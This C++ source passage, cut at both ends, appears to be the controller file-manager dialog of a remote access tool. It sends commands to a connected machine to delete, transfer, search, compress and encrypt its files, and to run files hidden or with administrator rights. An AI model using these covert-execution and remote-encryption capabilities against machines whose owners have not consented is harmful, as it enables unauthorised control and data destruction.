            str.Format(_T("确实要删除文件夹“%s”并将所有内容删除吗?"), file);
        else
            str.Format(_T("确实要把“%s”删除吗?"), file);
    }
    if (::MessageBox(m_hWnd, str, _T("确认删除"), MB_YESNO | MB_ICONQUESTION) == IDNO)
        return;
    m_Remote_Delete_Job.RemoveAll();
    POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
    while (pos) { //so long as we have a valid POSITION, we keep iterating
        int nItem = m_list_remote.GetNextSelectedItem(pos);
        CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
        // 如果是目录
        if (m_list_remote.GetItemData(nItem))
            file += _T('\\');

        m_Remote_Delete_Job.AddTail(file);
    }
    EnableControl(FALSE);
    // 发送第一个下载任务
    SendDeleteJob();
}

void CFileManagerDlg::OnRemoteStop()
{
    m_bIsStop = true;
}


void CFileManagerDlg::PostNcDestroy()
{
    if (!m_bIsClosed)
        OnClose();
    CDialog::PostNcDestroy();
    delete this;
}

void CFileManagerDlg::SendTransferMode()
{
    CFileTransferModeDlg	dlg(this);
    dlg.m_strFileName = m_strUploadRemoteFile;
    switch (dlg.DoModal()) {
    case IDC_OVERWRITE:
        m_nTransferMode = TRANSFER_MODE_OVERWRITE;
        break;
    case IDC_OVERWRITE_ALL:
        m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
        break;
    case IDC_ADDITION:
        m_nTransferMode = TRANSFER_MODE_ADDITION;
        break;
    case IDC_ADDITION_ALL:
        m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
        break;
    case IDC_JUMP:
        m_nTransferMode = TRANSFER_MODE_JUMP;
        break;
    case IDC_JUMP_ALL:
        m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
        break;
    case IDC_CANCEL:
        m_nTransferMode = TRANSFER_MODE_CANCEL;
        break;
    }
    if (m_nTransferMode == TRANSFER_MODE_CANCEL) {
        m_bIsStop = true;
        EndLocalUploadFile();
        return;
    }

    BYTE bToken[5];
    bToken[0] = COMMAND_SET_TRANSFER_MODE;
    memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
    m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
}

void CFileManagerDlg::SendFileData()
{
    FILESIZE* pFileSize = (FILESIZE*)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
    LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
    LONG	dwOffsetLow = pFileSize->dwSizeLow;

    m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

    ShowProgress();

    if (m_nCounter == m_nOperatingFileLength || (dwOffsetHigh == -1 && dwOffsetLow == -1) || m_bIsStop) {
        EndLocalUploadFile();
        return;
    }

    SetFilePointer(m_hFileSend, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

    int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9

    int dwDownFileSize = GetFileSize(m_hFileSend, NULL);

    DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
    DWORD	nNumberOfBytesRead = 0;

    BYTE* lpBuffer = (BYTE*)LocalAlloc(LPTR, MAX_SEND_BUFFER);
    // Token,  大小，偏移，数据
    lpBuffer[0] = COMMAND_FILE_DATA;
    memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
    memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));
    // 返回值
    bool	bRet = true;
    ReadFile(m_hFileSend, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
    //CloseHandle(m_hFileSend); // 此处不要关闭, 以后还要用

    if (nNumberOfBytesRead > 0) {
        int	nPacketSize = nNumberOfBytesRead + nHeadLength;
        m_iocpServer->Send2Client(m_ContextObject, lpBuffer, nPacketSize);
    }
    LocalFree(lpBuffer);
}

bool CFileManagerDlg::DeleteDirectory(LPCTSTR lpszDirectory)
{
    WIN32_FIND_DATA	wfd;
    TCHAR	lpszFilter[MAX_PATH];

    wsprintf(lpszFilter, _T("%s\\*.*"), lpszDirectory);

    HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
    if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
        return FALSE;

    do {
        if (wfd.cFileName[0] != '.') {
            if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                TCHAR strDirectory[MAX_PATH];
                wsprintf(strDirectory, _T("%s\\%s"), lpszDirectory, wfd.cFileName);
                DeleteDirectory(strDirectory);
            } else {
                TCHAR strFile[MAX_PATH];
                wsprintf(strFile, _T("%s\\%s"), lpszDirectory, wfd.cFileName);
                DeleteFile(strFile);
            }
        }
    } while (FindNextFile(hFind, &wfd));

    FindClose(hFind); // 关闭查找句柄

    if (!RemoveDirectory(lpszDirectory)) {
        return FALSE;
    }
    return true;
}


void CFileManagerDlg::OnRemoteNewFolder()
{
    if (m_Remote_Path == _T(""))
        return;

    CInputDialog	dlg(this);
    dlg.Init(_T("新建目录"), _T("请输入目录名称:"));
    if (dlg.DoModal() == IDOK && dlg.m_str.GetLength()) {
        CString file = m_Remote_Path + dlg.m_str + _T("\\");
        UINT	nPacketSize = (file.GetLength() + 1) * sizeof(TCHAR) + 1;
        LPBYTE	lpBuffer = new BYTE[nPacketSize];
        lpBuffer[0] = COMMAND_CREATE_FOLDER;
        memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
        m_iocpServer->Send2Client(m_ContextObject, lpBuffer, nPacketSize);
        SAFE_DELETE_AR(lpBuffer);
    }
}

void CFileManagerDlg::OnTransferRecv()
{
    OnRemoteCopy(); //下载
}

void CFileManagerDlg::OnRename()
{
    m_list_remote.EditLabel(m_list_remote.GetSelectionMark());
}


void CFileManagerDlg::OnEndLabelEditListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
    LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
    // TODO: Add your control notification handler code here
    CString str, strExistingFileName, strNewFileName;
    m_list_remote.GetEditControl()->GetWindowText(str);

    strExistingFileName = m_Remote_Path + m_list_remote.GetItemText(pDispInfo->item.iItem, 0);
    strNewFileName = m_Remote_Path + str;

    if (strExistingFileName != strNewFileName) {
        UINT nPacketSize = (strExistingFileName.GetLength() + 1) * sizeof(TCHAR) + (strNewFileName.GetLength() + 1) * sizeof(TCHAR) + 1;
        LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketSize);
        lpBuffer[0] = COMMAND_RENAME_FILE;
        memcpy(lpBuffer + 1, strExistingFileName.GetBuffer(0), (strExistingFileName.GetLength() + 1) * sizeof(TCHAR));
        memcpy(lpBuffer + 1 + (strExistingFileName.GetLength() + 1) * sizeof(TCHAR),
               strNewFileName.GetBuffer(0), (strNewFileName.GetLength() + 1) * sizeof(TCHAR));
        m_iocpServer->Send2Client(m_ContextObject, lpBuffer, nPacketSize);
        LocalFree(lpBuffer);
    }
    *pResult = 1;
}

void CFileManagerDlg::OnDelete()
{
    BYTE	bBuff;
    bBuff = COMMAND_FILE_NO_ENFORCE;
    m_iocpServer->Send2Client(m_ContextObject, &bBuff, sizeof(bBuff));
    OnRemoteDelete();
}

void CFileManagerDlg::OnDeleteEnforce()
{
    BYTE	bBuff;
    bBuff = COMMAND_FILE_ENFOCE;
    m_iocpServer->Send2Client(m_ContextObject, &bBuff, sizeof(bBuff));
    OnRemoteDelete();
}

void CFileManagerDlg::OnNewFolder()
{
    OnRemoteNewFolder();
}

void CFileManagerDlg::OnRefresh()
{
    GetRemoteFileList(_T("."));
}

void CFileManagerDlg::OnUseAdmin()
{
    if (!m_bUseAdmin)
        m_bUseAdmin = true;
    else
        m_bUseAdmin = false;
}

void CFileManagerDlg::OnRemoteOpenShow()
{
    // TODO: Add your command handler code here
    CString	str;
    int	nItem = m_list_remote.GetSelectionMark();
    str = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
    if (m_list_remote.GetItemData(nItem) == 1)
        str += "\\";

    int		nPacketLength = (str.GetLength() + 1) * sizeof(TCHAR) + 2;
    LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
    lpPacket[1] = m_bUseAdmin;
    memcpy(lpPacket + 2, str.GetBuffer(0), nPacketLength - 2);
    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
    LocalFree(lpPacket);
}

void CFileManagerDlg::OnRemoteOpenHide()
{
    // TODO: Add your command handler code here
    CString	str;
    int	nItem = m_list_remote.GetSelectionMark();
    str = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
    if (m_list_remote.GetItemData(nItem) == 1)
        str += _T("\\");

    int		nPacketLength = (str.GetLength() + 1) * sizeof(TCHAR) + 2;
    LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
    lpPacket[1] = m_bUseAdmin;
    memcpy(lpPacket + 2, str.GetBuffer(0), nPacketLength - 2);
    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
    LocalFree(lpPacket);
}

void CFileManagerDlg::OnRemoteInfo()
{
    // TODO: Add your command handler code here
    CString	str;
    int	nItem = m_list_remote.GetSelectionMark();
    str = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
    if (m_list_remote.GetItemData(nItem) == 1)
        str += _T("\\");

    int		nPacketLength = (str.GetLength() + 1) * sizeof(TCHAR) + 2;
    LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_FILE_INFO;
    memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
    LocalFree(lpPacket);
}

void CFileManagerDlg::OnRemoteEncryption()
{
    // TODO: Add your command handler code here
    CString	str;
    CStringA strA;
    int	nItem = m_list_remote.GetSelectionMark();
    str = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
    if (m_list_remote.GetItemData(nItem) == 1)
        str += _T("\\");
    strA = str;
    int		nPacketLength = strA.GetLength() + 1 + 1;
    LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_FILE_Encryption;

    memcpy(lpPacket + 1, strA.GetBuffer(0), nPacketLength - 1);
    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
    LocalFree(lpPacket);
}

void CFileManagerDlg::OnRemoteDecrypt()
{
    // TODO: Add your command handler code here
    CString	str;
    CStringA strA;
    int	nItem = m_list_remote.GetSelectionMark();
    str = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
    if (m_list_remote.GetItemData(nItem) == 1)
        str += _T("\\");
    strA = str;
    int		nPacketLength = strA.GetLength() + 1 + 1;
    LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_FILE_Decrypt;

    memcpy(lpPacket + 1, strA.GetBuffer(0), nPacketLength - 1);
    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
    LocalFree(lpPacket);
}


void CFileManagerDlg::OnRemoteCopyFile()
{
    CString	file;
    // TODO: Add your command handler code here
    POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
    while (pos) { //so long as we have a valid POSITION, we keep iterating
        int nItem = m_list_remote.GetNextSelectedItem(pos);
        file += (m_Remote_Path + m_list_remote.GetItemText(nItem, 0));
        file += "|";
    }

    int		nPacketLength = file.GetLength() * 2 + 2 + 1;
    LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_FILE_CopyFile;

    memcpy(lpPacket + 1, file.GetBuffer(0), nPacketLength - 1);
    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
    LocalFree(lpPacket);
    ShowMessage(_T("准备粘贴"));
}

void CFileManagerDlg::OnRemotePasteFile()
{
    int		nPacketLength = m_Remote_Path.GetLength() * 2 + 2 + 1;
    LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_FILE_PasteFile;
    memcpy(lpPacket + 1, m_Remote_Path.GetBuffer(0), nPacketLength - 1);
    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
    LocalFree(lpPacket);
}

void CFileManagerDlg::OnRemotezip()
{
    CString	file;
    file = m_Remote_Path;
    file += "|";
    // TODO: Add your command handler code here
    POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
    while (pos) { //so long as we have a valid POSITION, we keep iterating
        int nItem = m_list_remote.GetNextSelectedItem(pos);
        file += (m_Remote_Path + m_list_remote.GetItemText(nItem, 0));
        // 如果是目录
        if (m_list_remote.GetItemData(nItem))
            file += _T('\\');
        file += "|";
    }
    int		nPacketLength = file.GetLength() * 2 + 2 + 1;
    LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_FILE_zip;

    memcpy(lpPacket + 1, file.GetBuffer(0), nPacketLength - 1);
    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
    LocalFree(lpPacket);

    ShowMessage(_T("开始压缩，不要关闭窗口，其他操作继续"));
}

void CFileManagerDlg::OnRemotezipstop()
{
    BYTE	lpPacket = COMMAND_FILE_zip_stop;
    m_iocpServer->Send2Client(m_ContextObject, &lpPacket, 1);
}

void CFileManagerDlg::OnRclickListRemotedriver(NMHDR* pNMHDR, LRESULT* pResult)
{
    CMenu mListmeau;
    mListmeau.CreatePopupMenu();
    mListmeau.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("分区高级搜索"));
    POINT mousepos;
    GetCursorPos(&mousepos);
    int nMenuResult = ::TrackPopupMenu(mListmeau, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, mousepos.x, mousepos.y, 0, GetSafeHwnd(), NULL);
    mListmeau.DestroyMenu();
    if (!nMenuResult) 	return;
    switch (nMenuResult) {
    case 100: {
        UpdateData();

        //获取文件详细信息
        POSITION pos = m_list_remote_driver.GetFirstSelectedItemPosition();
        CString str_disk;
        if (pos != NULL) {
            int nItem = m_list_remote_driver.GetNextSelectedItem(pos);
            str_disk = m_list_remote_driver.GetItemText(nItem, 0);
            if (str_disk.Find(_T(":")) == -1) return;;
        }
        CInputDialog	dlg(this);
        dlg.Init(_T("确认后 必须等待出现结果"), _T("请输入要搜索的关键词"));
        if (dlg.DoModal() != IDOK)return;

        // 得到返回数据前禁窗口
        m_list_remote_search.DeleteAllItems();
        m_ProgressCtrl->SetPos(0);
        struct SEARCH {
            TCHAR TC_disk[8];
            TCHAR TC_search[MAX_PATH];
        };
        SEARCH S_search;
        memset(&S_search, 0, sizeof(SEARCH));

        memcpy(S_search.TC_disk, str_disk.GetBuffer(), str_disk.GetLength() * sizeof(TCHAR));
        if (dlg.m_str.GetLength() > (MAX_PATH - 5)) {
            MessageBox(_T("搜索关键词太长"), _T("注意"));
            return ;
        }
        memcpy(S_search.TC_search, dlg.m_str.GetBuffer(), dlg.m_str.GetLength() * sizeof(TCHAR));

        BYTE* lpbuffer = new BYTE[sizeof(SEARCH) + 1];
        lpbuffer[0] = COMMAND_FILE_SEARCHPLUS_LIST;
        memcpy(lpbuffer + 1, &S_search, sizeof(SEARCH));
        m_iocpServer->Send2Client(m_ContextObject, (LPBYTE)lpbuffer, sizeof(SEARCH) + 1);
        SAFE_DELETE_AR(lpbuffer);
        SetWindowPos(NULL, 0, 0, 830, 830, SWP_NOMOVE);
    }
    break;
    default:
        break;
    }
    *pResult = 0;
}

void CFileManagerDlg::OnRclickListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
    // TODO: Add your control notification handler code here
    int	nRemoteOpenMenuIndex = 5;
    CListCtrl* pListCtrl = &m_list_remote;
    CMenu	popup;
    popup.LoadMenu(IDR_FILEMANAGER);
    CMenu* pM = popup.GetSubMenu(0);
    CPoint	p;
    GetCursorPos(&p);
    //	pM->DeleteMenu(IDM_LOCAL_OPEN, MF_BYCOMMAND);
    if (pListCtrl->GetSelectedCount() == 0 || !m_Remote_Path.GetLength()) {
        int	count = pM->GetMenuItemCount();
        for (int i = 0; i < count; i++) {
            pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
        }
        if (m_Remote_Path.GetLength()) {
            pM->EnableMenuItem(IDM_TRANSFER_S, MF_BYCOMMAND | MF_ENABLED);
            pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
        }
        pM->EnableMenuItem(ID_FILEMANGER_ZIP, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(ID_FILEMANGER_COPY, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(IDM_DELETE_ENFORCE, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(ID_FILEMANGER_Encryption, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(ID_FILEMANGER_Encryption, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(IDM_COMPRESS, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(IDM_UNCOMPRESS, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(IDM_REMOTE_OPEN_HIDE, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(IDM_RENAME, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(ID_FILEMANGER_PASTE, MF_BYCOMMAND | MF_ENABLED);
    }
    if (pListCtrl->GetSelectedCount() == 1) {
        // 单选如果是目录, 不能隐藏运行
        if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1) {
            pM->EnableMenuItem(IDM_REMOTE_OPEN_HIDE, MF_BYCOMMAND | MF_GRAYED);
            pM->EnableMenuItem(IDM_REMOTE_OPEN_SHOW, MF_BYCOMMAND | MF_GRAYED);
        }
        pM->EnableMenuItem(ID_FILEMANGER_COPY, MF_BYCOMMAND | MF_ENABLED);
        pM->EnableMenuItem(ID_FILEMANGER_ZIP, MF_BYCOMMAND | MF_ENABLED);
        pM->EnableMenuItem(IDM_COMPRESS, MF_BYCOMMAND | MF_ENABLED);
        pM->EnableMenuItem(IDM_UNCOMPRESS, MF_BYCOMMAND | MF_ENABLED);
        pM->EnableMenuItem(ID_FILEMANGER_PASTE, MF_BYCOMMAND | MF_ENABLED);
    }
    if (pListCtrl->GetSelectedCount() > 1) {
        pM->EnableMenuItem(IDM_REMOTE_OPEN_SHOW, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(IDM_REMOTE_OPEN_HIDE, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(IDM_COMPRESS, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(IDM_UNCOMPRESS, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(IDM_RENAME, MF_BYCOMMAND | MF_GRAYED);
        pM->EnableMenuItem(ID_FILEMANGER_COPY, MF_BYCOMMAND | MF_ENABLED);
        pM->EnableMenuItem(ID_FILEMANGER_ZIP, MF_BYCOMMAND | MF_ENABLED);
        pM->EnableMenuItem(ID_FILEMANGER_PASTE, MF_BYCOMMAND | MF_ENABLED);
    }

    if (m_bCanAdmin)
        pM->EnableMenuItem(IDM_USE_ADMIN, MF_BYCOMMAND | MF_ENABLED);
    else
        pM->EnableMenuItem(IDM_USE_ADMIN, MF_BYCOMMAND | MF_GRAYED);

    if (m_bUseAdmin)
        pM->CheckMenuItem(IDM_USE_ADMIN, MF_BYCOMMAND | MF_CHECKED);
    else
        pM->CheckMenuItem(IDM_USE_ADMIN, MF_BYCOMMAND | MF_UNCHECKED);

    pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
    pM->EnableMenuItem(ID_FILEMANGER_ZIP_STOP, MF_BYCOMMAND | MF_ENABLED);
    ::TrackPopupMenu(pM->GetSafeHmenu(), TPM_RIGHTBUTTON, p.x, p.y, 0, GetSafeHwnd(), NULL);

    pM->DestroyMenu();
    *pResult = 0;
}

void CFileManagerDlg::OnRclickListSearch(NMHDR* pNMHDR, LRESULT* pResult)
{
    CMenu mListmeau;
    mListmeau.CreatePopupMenu();
    mListmeau.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("下载(附带目录结构)"));
    mListmeau.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("删除"));
    mListmeau.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("打开文件位置"));
    POINT mousepos;
    GetCursorPos(&mousepos);
    int nMenuResult = ::TrackPopupMenu(mListmeau, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, mousepos.x, mousepos.y, 0, GetSafeHwnd(), NULL);
    mListmeau.DestroyMenu();
    if (!nMenuResult) 	return;
    switch (nMenuResult) {
    case 100: {
        m_bIsUpload = false;
        EnableControl(FALSE);
        CString	file;
        m_Remote_Download_Job.RemoveAll();
        POSITION pos = m_list_remote_search.GetFirstSelectedItemPosition();
        CString m_Search_Path;
        while (pos) {
            int nItem = m_list_remote_search.GetNextSelectedItem(pos);
            m_Search_Path = m_list_remote_search.GetItemText(nItem, 3);
            m_Search_Path += '\\';
            file = m_Search_Path + m_list_remote_search.GetItemText(nItem, 0);
            if (m_list_remote_search.GetItemData(nItem))
                file += '\\';
            m_Remote_Download_Job.AddTail(file);
        }
        if (file.IsEmpty()) {
            EnableControl(TRUE);
            ::MessageBox(m_hWnd, _T("请选择文件！"), _T("警告"), MB_OK | MB_ICONWARNING);
            return;
        }
        strLpath = GetDirectoryPath(FALSE);
        if (strLpath == _T("")) {
            EnableControl(TRUE);
            return;
        }
        if (strLpath.GetAt(strLpath.GetLength() - 1) != _T('\\'))
            strLpath += _T("\\");
        m_nTransferMode = TRANSFER_MODE_NORMAL;
        SendDownloadJob();
    }
    break;
    case 200: {
        m_bIsUpload = false;
        // TODO: Add your command handler code here
        CString str;
        if (m_list_remote_search.GetSelectedCount() > 1)
            str.Format(_T("确定要将这 %d 项删除吗?"), m_list_remote_search.GetSelectedCount());
        else {
            CString file = m_list_remote_search.GetItemText(m_list_remote_search.GetSelectionMark(), 0);
            if (m_list_remote_search.GetItemData(m_list_remote_search.GetSelectionMark()) == 1)
                str.Format(_T("确实要删除文件夹“%s”并将所有内容删除吗?"), file);
            else
                str.Format(_T("确实要把“%s”删除吗?"), file);
        }
        if (::MessageBox(m_hWnd, str, _T("确认删除"), MB_YESNO | MB_ICONQUESTION) == IDNO)
            return;
        m_Remote_Delete_Job.RemoveAll();
        POSITION pos = m_list_remote_search.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
        CString m_Search_Path;
        while (pos) { //so long as we have a valid POSITION, we keep iterating
            int nItem = m_list_remote_search.GetNextSelectedItem(pos);
            m_Search_Path = m_list_remote_search.GetItemText(nItem, 3);
            m_Search_Path += '\\';
            CString	file = m_Search_Path + m_list_remote_search.GetItemText(nItem, 0);
            // 如果是目录
            if (m_list_remote_search.GetItemData(nItem))
                file += _T('\\');

            m_Remote_Delete_Job.AddTail(file);
        } //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

        EnableControl(FALSE);
        // 发送第一个下载任务
        SendDeleteJob();
    }
    break;
    case 300: {
        int Index = 0;
        Index = m_list_remote_search.GetSelectionMark();
        if (Index == -1)
            return;
        CString str = m_list_remote_search.GetItemText(Index, 3);
        if (Index == -1)
            return;
        m_Remote_Path = _T("");
        GetRemoteFileList(str);
    }
    break;

    default:
        break;
    }
    *pResult = 0;
}


bool CFileManagerDlg::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;
    __try {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));
        if (pszDirCopy == NULL)
            return FALSE;
        lstrcpy(pszDirCopy, pszDirPath);
        p = pszDirCopy;
        if ((*p == TEXT('\\')) && (*(p + 1) == TEXT('\\'))) {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.
            while (*p && *p != TEXT('\\')) {
                p = CharNext(p);
            }
            if (*p) {
                p++;
            }
            while (*p && *p != TEXT('\\')) {
                p = CharNext(p);
            }
            if (*p) {
                p++;
            }

        } else if (*(p + 1) == TEXT(':')) { // Not a UNC.  See if it's <drive>:
            p++;
            p++;
            if (*p && (*p == TEXT('\\'))) {
                p++;
            }
        }

        while (*p) {
            if (*p == TEXT('\\')) {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);
                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if (dwAttributes == 0xffffffff) {
                    if (!CreateDirectory(pszDirCopy, NULL)) {
                        if (GetLastError() != ERROR_ALREADY_EXISTS) {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                } else {
                    if ((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY) {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
                *p = TEXT('\\');
            }
            p = CharNext(p);
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}

//压缩处理
void CFileManagerDlg::OnCompress()
{
    // TODO: 在此添加命令处理程序代码
    //winrar a -r D:\123.she.rar d:\123.she    //加压
    UpdateData(TRUE);
    int i = m_list_remote.GetSelectionMark();
    if (i < 0) {
        return;
    }
    CString strMsg = _T("a -ep1 -ibck ");
    CString strFullFileName = m_list_remote.GetItemText(i, 0);
    if (m_list_remote.GetItemData(i)) { //文件夹
        strMsg += _T("-r ");
        strMsg += (m_Remote_Path + strFullFileName);
    } else {
        strMsg += (m_Remote_Path + strFullFileName);
    }
    strMsg += _T(".rar");
    strMsg += _T(" ");
    strMsg += (m_Remote_Path + strFullFileName);

    int		nPacketLength = (strMsg.GetLength() + 1) * sizeof(TCHAR) + 1;
    LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_COMPRESS_FILE_PARAM;
    memcpy(lpPacket + 1, strMsg.GetBuffer(0), nPacketLength - 1);
    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
    LocalFree(lpPacket);
}

void CFileManagerDlg::OnUncompress()
{
    // TODO: 在此添加命令处理程序代码
    // winrar x D:\11.she.rar D:\11.she\ 
    UpdateData(TRUE);
    int i = m_list_remote.GetSelectionMark();
    if (i < 0) {
        return;
    }
    CString strMsg = _T("x -ibck ");
    CString strFullFileName = m_list_remote.GetItemText(i, 0);

    CString strFullName = (m_Remote_Path + strFullFileName);
    strMsg += strFullName;
    //LFileName lFile(strFullName.GetBuffer(0));
    strMsg += _T(" ");
    strMsg += (m_Remote_Path/*+lFile.getNameA()*/);
    //strMsg += "\\";
    //COMMAND_UNCOMPRESS_FILE_PARAM
    int		nPacketLength = (strMsg.GetLength() + 1) * sizeof(TCHAR) + 1;
    LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_COMPRESS_FILE_PARAM;
    memcpy(lpPacket + 1, strMsg.GetBuffer(0), nPacketLength - 1);
    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
    LocalFree(lpPacket);
}

void CFileManagerDlg::OnSetfocusRemotePath()
{
    // TODO: Add your control notification handler code here
    m_list_remote.SetSelectionMark(-1);
}

void CFileManagerDlg::OnBtnSearch()
{
    UpdateData();

    // 	// 得到返回数据前禁窗口
    m_list_remote_search.DeleteAllItems();
    m_ProgressCtrl->SetPos(0);

    if (m_Remote_Path.IsEmpty()) return;

    // 构建数据包
    FILESEARCH mFileSearchPacket;
    lstrcpy(mFileSearchPacket.SearchPath, m_Remote_Path.GetBuffer(0));
    lstrcpy(mFileSearchPacket.SearchFileName, m_SearchStr.GetBuffer(0));
    if (m_bSubFordle)
        mFileSearchPacket.bEnabledSubfolder = true;
    else
        mFileSearchPacket.bEnabledSubfolder = false;

    int nPacketSize = sizeof(mFileSearchPacket) + 2;
    LPBYTE	lpBuffer = new BYTE[nPacketSize];
    lpBuffer[0] = COMMAND_SEARCH_FILE;
    memcpy(lpBuffer + 1, &mFileSearchPacket, sizeof(mFileSearchPacket));
    m_iocpServer->Send2Client(m_ContextObject, lpBuffer, nPacketSize);
    SAFE_DELETE_AR(lpBuffer);
    // 设置按钮状态
    m_BtnSearch.SetWindowText(_T("正在搜索..."));

    m_list_remote_search.ShowWindow(SW_SHOW);
    GetDlgItem(IDC_BTN_SEARCH)->EnableWindow(FALSE);
    GetDlgItem(ID_SEARCH_STOP)->EnableWindow(TRUE);
    SetWindowPos(NULL, 0, 0, 830, 830, SWP_NOMOVE);
}

void CFileManagerDlg::SearchEnd()
{
    int len = m_list_remote_search.GetItemCount();
    m_BtnSearch.SetWindowText(_T("重新搜索"));
    ShowMessage(_T("搜索完毕 共：%d 个文件"), len);
    m_list_remote_search.EnableWindow(TRUE);
    GetDlgItem(IDC_BTN_SEARCH)->EnableWindow(TRUE);
    GetDlgItem(ID_SEARCH_STOP)->EnableWindow(FALSE);
}


void CFileManagerDlg::FixedRemoteSearchFileList(BYTE* pbBuffer, DWORD dwBufferLen)
{
    byte* pList = pbBuffer + 1;
    int		nItemIndex = 0;
    for (byte* pBase = pList; (int)(pList - pBase) < (int)(dwBufferLen - 1);) {
        TCHAR* pszFileName = NULL;
        DWORD	dwFileSizeHigh = 0;
